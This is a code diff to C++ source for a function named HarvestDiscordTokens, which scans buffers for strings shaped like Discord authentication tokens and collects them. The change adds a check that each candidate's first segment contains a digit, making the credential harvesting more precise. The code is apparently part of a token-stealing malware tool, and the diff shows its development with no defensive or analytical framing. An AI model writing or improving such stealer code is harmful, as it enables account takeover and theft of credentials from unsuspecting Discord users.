@@ -1152,7 +1152,9 @@ static void HarvestDiscordTokens() {
                             bool v = true;
                             for (int k = i; k < dp[0]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                             for (int k = dp[0]+1; k < dp[1]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
-                            if (v) { totalCandidates++; tokens.push_back(std::string(buf + i, end - i)); }
+                            bool d = false;
+                            for (int k = i; k < dp[0]; k++) if (buf[k] >= '0' && buf[k] <= '9') { d = true; break; }
+                            if (v && d) { totalCandidates++; tokens.push_back(std::string(buf + i, end - i)); }
                         }
                     }
                     // Skip past this run of token chars
@@ -1225,7 +1227,9 @@ static void HarvestDiscordTokens() {
                                             bool v = true;
                                             for (int k = i; k < dp[0]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                                             for (int k = dp[0]+1; k < dp[1]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
-                                            if (v) tokens.push_back(std::string(buf + i, end - i));
+                                            bool d = false;
+                                            for (int k = i; k < dp[0]; k++) if (buf[k] >= '0' && buf[k] <= '9') { d = true; break; }
+                                            if (v && d) tokens.push_back(std::string(buf + i, end - i));
                                         }
                                     }
                                     while (i < rd && IsTokenChar(buf[i])) i++;
